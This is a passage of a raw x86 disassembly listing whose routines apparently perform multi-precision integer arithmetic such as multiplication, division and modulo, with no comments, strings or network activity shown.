  404822:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404826:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  40482a:	56                   	push   %esi
  40482b:	8b 75 04             	mov    0x4(%ebp),%esi
  40482e:	85 f6                	test   %esi,%esi
  404830:	74 14                	je     0x404846
  404832:	8b 45 08             	mov    0x8(%ebp),%eax
  404835:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  404838:	83 c0 fc             	add    $0xfffffffc,%eax
  40483b:	83 38 00             	cmpl   $0x0,(%eax)
  40483e:	75 06                	jne    0x404846
  404840:	83 e8 04             	sub    $0x4,%eax
  404843:	4e                   	dec    %esi
  404844:	75 f5                	jne    0x40483b
  404846:	53                   	push   %ebx
  404847:	8b 59 04             	mov    0x4(%ecx),%ebx
  40484a:	85 db                	test   %ebx,%ebx
  40484c:	74 14                	je     0x404862
  40484e:	8b 41 08             	mov    0x8(%ecx),%eax
  404851:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  404854:	83 c0 fc             	add    $0xfffffffc,%eax
  404857:	83 38 00             	cmpl   $0x0,(%eax)
  40485a:	75 06                	jne    0x404862
  40485c:	83 e8 04             	sub    $0x4,%eax
  40485f:	4b                   	dec    %ebx
  404860:	75 f5                	jne    0x404857
  404862:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  404865:	50                   	push   %eax
  404866:	52                   	push   %edx
  404867:	e8 89 f1 ff ff       	call   0x4039f5
  40486c:	8b f8                	mov    %eax,%edi
  40486e:	85 ff                	test   %edi,%edi
  404870:	75 5d                	jne    0x4048cf
  404872:	50                   	push   %eax
  404873:	ff 74 24 34          	push   0x34(%esp)
  404877:	e8 77 f4 ff ff       	call   0x403cf3
  40487c:	8b f8                	mov    %eax,%edi
  40487e:	89 7c 24 10          	mov    %edi,0x10(%esp)
  404882:	85 ff                	test   %edi,%edi
  404884:	75 49                	jne    0x4048cf
  404886:	85 db                	test   %ebx,%ebx
  404888:	74 35                	je     0x4048bf
  40488a:	8b 7c 24 30          	mov    0x30(%esp),%edi
  40488e:	8b ce                	mov    %esi,%ecx
  404890:	8b 74 24 38          	mov    0x38(%esp),%esi
  404894:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  404898:	8b 46 08             	mov    0x8(%esi),%eax
  40489b:	ff 74 98 fc          	push   -0x4(%eax,%ebx,4)
  40489f:	8b 47 08             	mov    0x8(%edi),%eax
  4048a2:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  4048a5:	83 c0 fc             	add    $0xfffffffc,%eax
  4048a8:	50                   	push   %eax
  4048a9:	ff 75 08             	push   0x8(%ebp)
  4048ac:	51                   	push   %ecx
  4048ad:	e8 c3 14 00 00       	call   0x405d75
  4048b2:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4048b6:	4b                   	dec    %ebx
  4048b7:	75 df                	jne    0x404898
  4048b9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4048bd:	eb 04                	jmp    0x4048c3
  4048bf:	8b 74 24 38          	mov    0x38(%esp),%esi
  4048c3:	8b 45 00             	mov    0x0(%ebp),%eax
  4048c6:	0f af 06             	imul   (%esi),%eax
  4048c9:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4048cd:	89 01                	mov    %eax,(%ecx)
  4048cf:	5b                   	pop    %ebx
  4048d0:	5e                   	pop    %esi
  4048d1:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4048d5:	50                   	push   %eax
  4048d6:	e8 e5 f0 ff ff       	call   0x4039c0
  4048db:	8d 44 24 18          	lea    0x18(%esp),%eax
  4048df:	50                   	push   %eax
  4048e0:	e8 db f0 ff ff       	call   0x4039c0
  4048e5:	8b c7                	mov    %edi,%eax
  4048e7:	5f                   	pop    %edi
  4048e8:	5d                   	pop    %ebp
  4048e9:	83 c4 1c             	add    $0x1c,%esp
  4048ec:	c2 0c 00             	ret    $0xc
  4048ef:	55                   	push   %ebp
  4048f0:	8b ec                	mov    %esp,%ebp
  4048f2:	83 ec 10             	sub    $0x10,%esp
  4048f5:	33 c0                	xor    %eax,%eax
  4048f7:	40                   	inc    %eax
  4048f8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4048fb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4048fe:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404901:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404904:	8b 45 10             	mov    0x10(%ebp),%eax
  404907:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40490a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40490d:	50                   	push   %eax
  40490e:	ff 75 0c             	push   0xc(%ebp)
  404911:	ff 75 08             	push   0x8(%ebp)
  404914:	e8 a6 fe ff ff       	call   0x4047bf
  404919:	8b e5                	mov    %ebp,%esp
  40491b:	5d                   	pop    %ebp
  40491c:	c2 0c 00             	ret    $0xc
  40491f:	83 ec 44             	sub    $0x44,%esp
  404922:	55                   	push   %ebp
  404923:	8b 6c 24 58          	mov    0x58(%esp),%ebp
  404927:	57                   	push   %edi
  404928:	33 ff                	xor    %edi,%edi
  40492a:	57                   	push   %edi
  40492b:	55                   	push   %ebp
  40492c:	e8 b2 fb ff ff       	call   0x4044e3
  404931:	85 c0                	test   %eax,%eax
  404933:	75 08                	jne    0x40493d
  404935:	6a f4                	push   $0xfffffff4
  404937:	58                   	pop    %eax
  404938:	e9 15 04 00 00       	jmp    0x404d52
  40493d:	53                   	push   %ebx
  40493e:	56                   	push   %esi
  40493f:	8d 44 24 18          	lea    0x18(%esp),%eax
  404943:	50                   	push   %eax
  404944:	e8 5e f0 ff ff       	call   0x4039a7
  404949:	8d 44 24 24          	lea    0x24(%esp),%eax
  40494d:	50                   	push   %eax
  40494e:	e8 54 f0 ff ff       	call   0x4039a7
  404953:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  404957:	50                   	push   %eax
  404958:	e8 4a f0 ff ff       	call   0x4039a7
  40495d:	8d 44 24 30          	lea    0x30(%esp),%eax
  404961:	50                   	push   %eax
  404962:	e8 40 f0 ff ff       	call   0x4039a7
  404967:	8d 44 24 48          	lea    0x48(%esp),%eax
  40496b:	50                   	push   %eax
  40496c:	e8 36 f0 ff ff       	call   0x4039a7
  404971:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  404975:	55                   	push   %ebp
  404976:	53                   	push   %ebx
  404977:	e8 55 fa ff ff       	call   0x4043d1
  40497c:	85 c0                	test   %eax,%eax
  40497e:	79 3b                	jns    0x4049bb
  404980:	39 7c 24 58          	cmp    %edi,0x58(%esp)
  404984:	74 14                	je     0x40499a
  404986:	57                   	push   %edi
  404987:	ff 74 24 5c          	push   0x5c(%esp)
  40498b:	e8 63 f3 ff ff       	call   0x403cf3
  404990:	8b f0                	mov    %eax,%esi
  404992:	85 f6                	test   %esi,%esi
  404994:	0f 85 82 03 00 00    	jne    0x404d1c
  40499a:	39 7c 24 5c          	cmp    %edi,0x5c(%esp)
  40499e:	74 14                	je     0x4049b4
  4049a0:	53                   	push   %ebx
  4049a1:	ff 74 24 60          	push   0x60(%esp)
  4049a5:	e8 40 f1 ff ff       	call   0x403aea
  4049aa:	8b f0                	mov    %eax,%esi
  4049ac:	85 f6                	test   %esi,%esi
  4049ae:	0f 85 68 03 00 00    	jne    0x404d1c
  4049b4:	33 c0                	xor    %eax,%eax
  4049b6:	e9 95 03 00 00       	jmp    0x404d50
  4049bb:	53                   	push   %ebx
  4049bc:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4049c0:	50                   	push   %eax
  4049c1:	e8 24 f1 ff ff       	call   0x403aea
  4049c6:	8b f0                	mov    %eax,%esi
  4049c8:	85 f6                	test   %esi,%esi
  4049ca:	0f 85 4c 03 00 00    	jne    0x404d1c
  4049d0:	55                   	push   %ebp
  4049d1:	8d 44 24 28          	lea    0x28(%esp),%eax
  4049d5:	50                   	push   %eax
  4049d6:	e8 0f f1 ff ff       	call   0x403aea
  4049db:	8b f0                	mov    %eax,%esi
  4049dd:	85 f6                	test   %esi,%esi
  4049df:	0f 85 37 03 00 00    	jne    0x404d1c
  4049e5:	40                   	inc    %eax
  4049e6:	89 44 24 24          	mov    %eax,0x24(%esp)
  4049ea:	89 44 24 18          	mov    %eax,0x18(%esp)
  4049ee:	8b 43 04             	mov    0x4(%ebx),%eax
  4049f1:	83 c0 02             	add    $0x2,%eax
  4049f4:	50                   	push   %eax
  4049f5:	8d 44 24 40          	lea    0x40(%esp),%eax
  4049f9:	50                   	push   %eax
  4049fa:	e8 f6 ef ff ff       	call   0x4039f5
  4049ff:	8b f0                	mov    %eax,%esi
  404a01:	85 f6                	test   %esi,%esi
  404a03:	0f 85 13 03 00 00    	jne    0x404d1c
  404a09:	57                   	push   %edi
  404a0a:	8d 44 24 40          	lea    0x40(%esp),%eax
  404a0e:	50                   	push   %eax
  404a0f:	e8 df f2 ff ff       	call   0x403cf3
  404a14:	8b f0                	mov    %eax,%esi
  404a16:	85 f6                	test   %esi,%esi
  404a18:	0f 85 fe 02 00 00    	jne    0x404d1c
  404a1e:	6a 02                	push   $0x2
  404a20:	8d 44 24 34          	lea    0x34(%esp),%eax
  404a24:	50                   	push   %eax
  404a25:	e8 cb ef ff ff       	call   0x4039f5
  404a2a:	8b f0                	mov    %eax,%esi
  404a2c:	85 f6                	test   %esi,%esi
  404a2e:	0f 85 e8 02 00 00    	jne    0x404d1c
  404a34:	6a 03                	push   $0x3
  404a36:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  404a3a:	50                   	push   %eax
  404a3b:	e8 b5 ef ff ff       	call   0x4039f5
  404a40:	8b f0                	mov    %eax,%esi
  404a42:	85 f6                	test   %esi,%esi
  404a44:	0f 85 d2 02 00 00    	jne    0x404d1c
  404a4a:	8d 44 24 24          	lea    0x24(%esp),%eax
  404a4e:	50                   	push   %eax
  404a4f:	e8 d2 f3 ff ff       	call   0x403e26
  404a54:	6a 1f                	push   $0x1f
  404a56:	5d                   	pop    %ebp
  404a57:	23 c5                	and    %ebp,%eax
  404a59:	3b c5                	cmp    %ebp,%eax
  404a5b:	73 2e                	jae    0x404a8b
  404a5d:	2b e8                	sub    %eax,%ebp
  404a5f:	8d 44 24 18          	lea    0x18(%esp),%eax
  404a63:	55                   	push   %ebp
  404a64:	50                   	push   %eax
  404a65:	e8 f0 f7 ff ff       	call   0x40425a
  404a6a:	8b f0                	mov    %eax,%esi
  404a6c:	85 f6                	test   %esi,%esi
  404a6e:	0f 85 a8 02 00 00    	jne    0x404d1c
  404a74:	55                   	push   %ebp
  404a75:	8d 44 24 28          	lea    0x28(%esp),%eax
  404a79:	50                   	push   %eax
  404a7a:	e8 db f7 ff ff       	call   0x40425a
  404a7f:	8b f0                	mov    %eax,%esi
  404a81:	85 f6                	test   %esi,%esi
  404a83:	0f 85 93 02 00 00    	jne    0x404d1c
  404a89:	eb 02                	jmp    0x404a8d
  404a8b:	8b ef                	mov    %edi,%ebp
  404a8d:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404a91:	8b 44 24 28          	mov    0x28(%esp),%eax
  404a95:	4b                   	dec    %ebx
  404a96:	48                   	dec    %eax
  404a97:	8b fb                	mov    %ebx,%edi
  404a99:	2b f8                	sub    %eax,%edi
  404a9b:	89 44 24 14          	mov    %eax,0x14(%esp)
  404a9f:	8b c7                	mov    %edi,%eax
  404aa1:	c1 e0 05             	shl    $0x5,%eax
  404aa4:	50                   	push   %eax
  404aa5:	89 44 24 14          	mov    %eax,0x14(%esp)
  404aa9:	8d 44 24 28          	lea    0x28(%esp),%eax
  404aad:	50                   	push   %eax
  404aae:	e8 a7 f7 ff ff       	call   0x40425a
  404ab3:	eb 17                	jmp    0x404acc
  404ab5:	8b 44 24 44          	mov    0x44(%esp),%eax
  404ab9:	ff 04 b8             	incl   (%eax,%edi,4)
  404abc:	8d 44 24 24          	lea    0x24(%esp),%eax
  404ac0:	50                   	push   %eax
  404ac1:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404ac5:	50                   	push   %eax
  404ac6:	50                   	push   %eax
  404ac7:	e8 11 fc ff ff       	call   0x4046dd
  404acc:	8b f0                	mov    %eax,%esi
  404ace:	85 f6                	test   %esi,%esi
  404ad0:	0f 85 46 02 00 00    	jne    0x404d1c
  404ad6:	8d 44 24 24          	lea    0x24(%esp),%eax
  404ada:	50                   	push   %eax
  404adb:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404adf:	50                   	push   %eax
  404ae0:	e8 66 f9 ff ff       	call   0x40444b
  404ae5:	85 c0                	test   %eax,%eax
  404ae7:	79 cc                	jns    0x404ab5
  404ae9:	ff 74 24 10          	push   0x10(%esp)
  404aed:	8d 44 24 28          	lea    0x28(%esp),%eax
  404af1:	50                   	push   %eax
  404af2:	e8 2d f8 ff ff       	call   0x404324
  404af7:	8b f0                	mov    %eax,%esi
  404af9:	85 f6                	test   %esi,%esi
  404afb:	0f 85 1b 02 00 00    	jne    0x404d1c
  404b01:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404b05:	3b d9                	cmp    %ecx,%ebx
  404b07:	0f 86 a0 01 00 00    	jbe    0x404cad
  404b0d:	8b 44 24 10          	mov    0x10(%esp),%eax
  404b11:	83 c0 e0             	add    $0xffffffe0,%eax
  404b14:	89 44 24 10          	mov    %eax,0x10(%esp)
  404b18:	8b 44 24 44          	mov    0x44(%esp),%eax
  404b1c:	83 e8 04             	sub    $0x4,%eax
  404b1f:	8d 3c b8             	lea    (%eax,%edi,4),%edi
  404b22:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404b26:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404b29:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404b2d:	39 04 99             	cmp    %eax,(%ecx,%ebx,4)
  404b30:	72 05                	jb     0x404b37
  404b32:	83 0f ff             	orl    $0xffffffff,(%edi)
  404b35:	eb 11                	jmp    0x404b48
  404b37:	6a 00                	push   $0x0
  404b39:	50                   	push   %eax
  404b3a:	ff 74 99 fc          	push   -0x4(%ecx,%ebx,4)
  404b3e:	ff 34 99             	push   (%ecx,%ebx,4)
  404b41:	e8 ae 13 00 00       	call   0x405ef4
  404b46:	89 07                	mov    %eax,(%edi)
  404b48:	ff 07                	incl   (%edi)
  404b4a:	ff 0f                	decl   (%edi)
  404b4c:	8d 44 24 30          	lea    0x30(%esp),%eax
  404b50:	6a 00                	push   $0x0
  404b52:	50                   	push   %eax
  404b53:	e8 9b f1 ff ff       	call   0x403cf3
  404b58:	8b f0                	mov    %eax,%esi
  404b5a:	85 f6                	test   %esi,%esi
  404b5c:	0f 85 ba 01 00 00    	jne    0x404d1c
  404b62:	8b 54 24 14          	mov    0x14(%esp),%edx
  404b66:	83 fa 01             	cmp    $0x1,%edx
  404b69:	72 08                	jb     0x404b73
  404b6b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404b6f:	8b 44 90 fc          	mov    -0x4(%eax,%edx,4),%eax
  404b73:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  404b77:	89 01                	mov    %eax,(%ecx)
  404b79:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404b7d:	8b 04 90             	mov    (%eax,%edx,4),%eax
  404b80:	89 41 04             	mov    %eax,0x4(%ecx)
  404b83:	8d 44 24 30          	lea    0x30(%esp),%eax
  404b87:	ff 37                	push   (%edi)
  404b89:	50                   	push   %eax
  404b8a:	50                   	push   %eax
  404b8b:	e8 5f fd ff ff       	call   0x4048ef
  404b90:	8b f0                	mov    %eax,%esi
  404b92:	85 f6                	test   %esi,%esi
  404b94:	0f 85 82 01 00 00    	jne    0x404d1c
  404b9a:	50                   	push   %eax
  404b9b:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  404b9f:	50                   	push   %eax
  404ba0:	e8 4e f1 ff ff       	call   0x403cf3
  404ba5:	8b f0                	mov    %eax,%esi
  404ba7:	85 f6                	test   %esi,%esi
  404ba9:	0f 85 6d 01 00 00    	jne    0x404d1c
  404baf:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404bb3:	83 fb 02             	cmp    $0x2,%ebx
  404bb6:	72 04                	jb     0x404bbc
  404bb8:	8b 44 99 f8          	mov    -0x8(%ecx,%ebx,4),%eax
  404bbc:	8b 54 24 50          	mov    0x50(%esp),%edx
  404bc0:	89 02                	mov    %eax,(%edx)
  404bc2:	83 fb 01             	cmp    $0x1,%ebx
  404bc5:	73 04                	jae    0x404bcb
  404bc7:	33 c0                	xor    %eax,%eax
  404bc9:	eb 04                	jmp    0x404bcf
  404bcb:	8b 44 99 fc          	mov    -0x4(%ecx,%ebx,4),%eax
  404bcf:	89 42 04             	mov    %eax,0x4(%edx)
  404bd2:	8b 04 99             	mov    (%ecx,%ebx,4),%eax
  404bd5:	89 42 08             	mov    %eax,0x8(%edx)
  404bd8:	8d 44 24 48          	lea    0x48(%esp),%eax
  404bdc:	50                   	push   %eax
  404bdd:	8d 44 24 34          	lea    0x34(%esp),%eax
  404be1:	50                   	push   %eax
  404be2:	e8 64 f8 ff ff       	call   0x40444b
  404be7:	85 c0                	test   %eax,%eax
  404be9:	0f 8f 5b ff ff ff    	jg     0x404b4a
  404bef:	ff 37                	push   (%edi)
  404bf1:	8d 44 24 28          	lea    0x28(%esp),%eax
  404bf5:	50                   	push   %eax
  404bf6:	8d 44 24 38          	lea    0x38(%esp),%eax
  404bfa:	50                   	push   %eax
  404bfb:	e8 ef fc ff ff       	call   0x4048ef
  404c00:	8b f0                	mov    %eax,%esi
  404c02:	85 f6                	test   %esi,%esi
  404c04:	0f 85 12 01 00 00    	jne    0x404d1c
  404c0a:	ff 74 24 10          	push   0x10(%esp)
  404c0e:	8d 44 24 34          	lea    0x34(%esp),%eax
  404c12:	50                   	push   %eax
  404c13:	e8 42 f6 ff ff       	call   0x40425a
  404c18:	8b f0                	mov    %eax,%esi
  404c1a:	85 f6                	test   %esi,%esi
  404c1c:	0f 85 fa 00 00 00    	jne    0x404d1c
  404c22:	8d 44 24 30          	lea    0x30(%esp),%eax
  404c26:	50                   	push   %eax
  404c27:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404c2b:	50                   	push   %eax
  404c2c:	50                   	push   %eax
  404c2d:	e8 ab fa ff ff       	call   0x4046dd
  404c32:	8b f0                	mov    %eax,%esi
  404c34:	85 f6                	test   %esi,%esi
  404c36:	0f 85 e0 00 00 00    	jne    0x404d1c
  404c3c:	50                   	push   %eax
  404c3d:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404c41:	50                   	push   %eax
  404c42:	e8 9c f8 ff ff       	call   0x4044e3
  404c47:	85 c0                	test   %eax,%eax
  404c49:	79 4d                	jns    0x404c98
  404c4b:	8d 44 24 24          	lea    0x24(%esp),%eax
  404c4f:	50                   	push   %eax
  404c50:	8d 44 24 34          	lea    0x34(%esp),%eax
  404c54:	50                   	push   %eax
  404c55:	e8 90 ee ff ff       	call   0x403aea
  404c5a:	8b f0                	mov    %eax,%esi
  404c5c:	85 f6                	test   %esi,%esi
  404c5e:	0f 85 b8 00 00 00    	jne    0x404d1c
  404c64:	ff 74 24 10          	push   0x10(%esp)
  404c68:	8d 44 24 34          	lea    0x34(%esp),%eax
  404c6c:	50                   	push   %eax
  404c6d:	e8 e8 f5 ff ff       	call   0x40425a
  404c72:	8b f0                	mov    %eax,%esi
  404c74:	85 f6                	test   %esi,%esi
  404c76:	0f 85 a0 00 00 00    	jne    0x404d1c
  404c7c:	8d 44 24 30          	lea    0x30(%esp),%eax
  404c80:	50                   	push   %eax
  404c81:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404c85:	50                   	push   %eax
  404c86:	50                   	push   %eax
  404c87:	e8 f9 f9 ff ff       	call   0x404685
  404c8c:	8b f0                	mov    %eax,%esi
  404c8e:	85 f6                	test   %esi,%esi
  404c90:	0f 85 86 00 00 00    	jne    0x404d1c
  404c96:	ff 0f                	decl   (%edi)
  404c98:	83 6c 24 10 20       	subl   $0x20,0x10(%esp)
  404c9d:	4b                   	dec    %ebx
  404c9e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404ca2:	83 ef 04             	sub    $0x4,%edi
  404ca5:	3b d9                	cmp    %ecx,%ebx
  404ca7:	0f 87 75 fe ff ff    	ja     0x404b22
  404cad:	8b 7c 24 58          	mov    0x58(%esp),%edi
  404cb1:	85 ff                	test   %edi,%edi
  404cb3:	74 22                	je     0x404cd7
  404cb5:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  404cb9:	50                   	push   %eax
  404cba:	57                   	push   %edi
  404cbb:	e8 2a ee ff ff       	call   0x403aea
  404cc0:	8b f0                	mov    %eax,%esi
  404cc2:	85 f6                	test   %esi,%esi
  404cc4:	75 56                	jne    0x404d1c
  404cc6:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  404cca:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  404cce:	8b 03                	mov    (%ebx),%eax
  404cd0:	0f af 01             	imul   (%ecx),%eax
  404cd3:	89 07                	mov    %eax,(%edi)
  404cd5:	eb 04                	jmp    0x404cdb
  404cd7:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  404cdb:	8b 7c 24 5c          	mov    0x5c(%esp),%edi
  404cdf:	85 ff                	test   %edi,%edi
  404ce1:	74 39                	je     0x404d1c
  404ce3:	55                   	push   %ebp
  404ce4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404ce8:	50                   	push   %eax
  404ce9:	e8 36 f6 ff ff       	call   0x404324
  404cee:	8b f0                	mov    %eax,%esi
  404cf0:	85 f6                	test   %esi,%esi
  404cf2:	75 28                	jne    0x404d1c
  404cf4:	8b 03                	mov    (%ebx),%eax
  404cf6:	89 44 24 18          	mov    %eax,0x18(%esp)
  404cfa:	8d 44 24 18          	lea    0x18(%esp),%eax
  404cfe:	50                   	push   %eax
  404cff:	57                   	push   %edi
  404d00:	e8 e5 ed ff ff       	call   0x403aea
  404d05:	8b f0                	mov    %eax,%esi
  404d07:	85 f6                	test   %esi,%esi
  404d09:	75 11                	jne    0x404d1c
  404d0b:	50                   	push   %eax
  404d0c:	57                   	push   %edi
  404d0d:	e8 d1 f7 ff ff       	call   0x4044e3
  404d12:	85 c0                	test   %eax,%eax
  404d14:	75 06                	jne    0x404d1c
  404d16:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  404d1c:	8d 44 24 18          	lea    0x18(%esp),%eax
  404d20:	50                   	push   %eax
  404d21:	e8 9a ec ff ff       	call   0x4039c0
  404d26:	8d 44 24 24          	lea    0x24(%esp),%eax
  404d2a:	50                   	push   %eax
  404d2b:	e8 90 ec ff ff       	call   0x4039c0
  404d30:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  404d34:	50                   	push   %eax
  404d35:	e8 86 ec ff ff       	call   0x4039c0
  404d3a:	8d 44 24 30          	lea    0x30(%esp),%eax
  404d3e:	50                   	push   %eax
  404d3f:	e8 7c ec ff ff       	call   0x4039c0
  404d44:	8d 44 24 48          	lea    0x48(%esp),%eax
  404d48:	50                   	push   %eax
  404d49:	e8 72 ec ff ff       	call   0x4039c0
  404d4e:	8b c6                	mov    %esi,%eax
  404d50:	5e                   	pop    %esi
  404d51:	5b                   	pop    %ebx
  404d52:	5f                   	pop    %edi
  404d53:	5d                   	pop    %ebp
  404d54:	83 c4 44             	add    $0x44,%esp
  404d57:	c2 10 00             	ret    $0x10
  404d5a:	55                   	push   %ebp
  404d5b:	8b ec                	mov    %esp,%ebp
  404d5d:	83 ec 10             	sub    $0x10,%esp
  404d60:	8b 45 14             	mov    0x14(%ebp),%eax
  404d63:	99                   	cltd
  404d64:	33 c2                	xor    %edx,%eax
  404d66:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  404d6d:	2b c2                	sub    %edx,%eax
  404d6f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d72:	33 c0                	xor    %eax,%eax
  404d74:	39 45 14             	cmp    %eax,0x14(%ebp)
  404d77:	0f 9d c0             	setge  %al
  404d7a:	8d 04 45 ff ff ff ff 	lea    -0x1(,%eax,2),%eax
  404d81:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404d84:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404d87:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404d8a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404d8d:	50                   	push   %eax
  404d8e:	ff 75 10             	push   0x10(%ebp)
  404d91:	ff 75 0c             	push   0xc(%ebp)
  404d94:	ff 75 08             	push   0x8(%ebp)
  404d97:	e8 83 fb ff ff       	call   0x40491f
  404d9c:	8b e5                	mov    %ebp,%esp
  404d9e:	5d                   	pop    %ebp
  404d9f:	c2 10 00             	ret    $0x10
  404da2:	55                   	push   %ebp
  404da3:	57                   	push   %edi
  404da4:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404da8:	33 ed                	xor    %ebp,%ebp
  404daa:	55                   	push   %ebp
  404dab:	57                   	push   %edi
  404dac:	e8 32 f7 ff ff       	call   0x4044e3
  404db1:	85 c0                	test   %eax,%eax
  404db3:	79 05                	jns    0x404dba
  404db5:	6a f6                	push   $0xfffffff6
  404db7:	58                   	pop    %eax
  404db8:	eb 4c                	jmp    0x404e06
  404dba:	53                   	push   %ebx
  404dbb:	56                   	push   %esi
  404dbc:	8b 74 24 14          	mov    0x14(%esp),%esi
  404dc0:	57                   	push   %edi
  404dc1:	ff 74 24 1c          	push   0x1c(%esp)
  404dc5:	56                   	push   %esi
  404dc6:	55                   	push   %ebp
  404dc7:	e8 53 fb ff ff       	call   0x40491f
  404dcc:	eb 06                	jmp    0x404dd4
  404dce:	56                   	push   %esi
  404dcf:	e8 b1 f8 ff ff       	call   0x404685
  404dd4:	8b d8                	mov    %eax,%ebx
  404dd6:	85 db                	test   %ebx,%ebx
  404dd8:	75 28                	jne    0x404e02
  404dda:	55                   	push   %ebp
  404ddb:	56                   	push   %esi
  404ddc:	e8 02 f7 ff ff       	call   0x4044e3
  404de1:	57                   	push   %edi
  404de2:	56                   	push   %esi
  404de3:	85 c0                	test   %eax,%eax
  404de5:	78 e7                	js     0x404dce
  404de7:	eb 10                	jmp    0x404df9
  404de9:	57                   	push   %edi
  404dea:	56                   	push   %esi
  404deb:	56                   	push   %esi
  404dec:	e8 ec f8 ff ff       	call   0x4046dd
  404df1:	8b d8                	mov    %eax,%ebx
  404df3:	85 db                	test   %ebx,%ebx
  404df5:	75 0b                	jne    0x404e02
  404df7:	57                   	push   %edi
  404df8:	56                   	push   %esi
  404df9:	e8 4d f6 ff ff       	call   0x40444b
  404dfe:	85 c0                	test   %eax,%eax
  404e00:	79 e7                	jns    0x404de9
  404e02:	5e                   	pop    %esi
  404e03:	8b c3                	mov    %ebx,%eax
  404e05:	5b                   	pop    %ebx
  404e06:	5f                   	pop    %edi
  404e07:	5d                   	pop    %ebp
  404e08:	c2 0c 00             	ret    $0xc
  404e0b:	56                   	push   %esi
  404e0c:	8b 74 24 10          	mov    0x10(%esp),%esi
  404e10:	85 f6                	test   %esi,%esi
  404e12:	75 08                	jne    0x404e1c
  404e14:	6a f4                	push   $0xfffffff4
  404e16:	58                   	pop    %eax
  404e17:	e9 92 00 00 00       	jmp    0x404eae
  404e1c:	79 04                	jns    0x404e22
  404e1e:	6a f6                	push   $0xfffffff6
  404e20:	eb f4                	jmp    0x404e16
  404e22:	83 fe 01             	cmp    $0x1,%esi
  404e25:	75 09                	jne    0x404e30
  404e27:	8b 44 24 08          	mov    0x8(%esp),%eax
  404e2b:	83 20 00             	andl   $0x0,(%eax)
  404e2e:	eb 7c                	jmp    0x404eac
  404e30:	83 fe 02             	cmp    $0x2,%esi
  404e33:	75 14                	jne    0x404e49
  404e35:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404e39:	8b 40 08             	mov    0x8(%eax),%eax
  404e3c:	8b 08                	mov    (%eax),%ecx
  404e3e:	8b 44 24 08          	mov    0x8(%esp),%eax
  404e42:	83 e1 01             	and    $0x1,%ecx
  404e45:	89 08                	mov    %ecx,(%eax)
  404e47:	eb 63                	jmp    0x404eac
  404e49:	53                   	push   %ebx
  404e4a:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404e4e:	55                   	push   %ebp
  404e4f:	57                   	push   %edi
  404e50:	33 ff                	xor    %edi,%edi
  404e52:	8b 6b 04             	mov    0x4(%ebx),%ebp
  404e55:	85 ed                	test   %ebp,%ebp
  404e57:	74 3d                	je     0x404e96
  404e59:	8b 43 08             	mov    0x8(%ebx),%eax
  404e5c:	8d 5d ff             	lea    -0x1(%ebp),%ebx
  404e5f:	8d 1c 98             	lea    (%eax,%ebx,4),%ebx
  404e62:	8b 0b                	mov    (%ebx),%ecx
  404e64:	33 d2                	xor    %edx,%edx
  404e66:	c1 e7 10             	shl    $0x10,%edi
  404e69:	8d 5b fc             	lea    -0x4(%ebx),%ebx
  404e6c:	8b c1                	mov    %ecx,%eax
  404e6e:	c1 e8 10             	shr    $0x10,%eax
  404e71:	0b f8                	or     %eax,%edi
  404e73:	8b c7                	mov    %edi,%eax
  404e75:	f7 f6                	div    %esi
  404e77:	33 d2                	xor    %edx,%edx
  404e79:	0f af c6             	imul   %esi,%eax
  404e7c:	2b f8                	sub    %eax,%edi
  404e7e:	0f b7 c1             	movzwl %cx,%eax
  404e81:	c1 e7 10             	shl    $0x10,%edi
  404e84:	0b f8                	or     %eax,%edi
  404e86:	8b c7                	mov    %edi,%eax
  404e88:	f7 f6                	div    %esi
  404e8a:	0f af c6             	imul   %esi,%eax
  404e8d:	2b f8                	sub    %eax,%edi
  404e8f:	4d                   	dec    %ebp
  404e90:	75 d0                	jne    0x404e62
  404e92:	8b 5c 24 18          	mov    0x18(%esp),%ebx
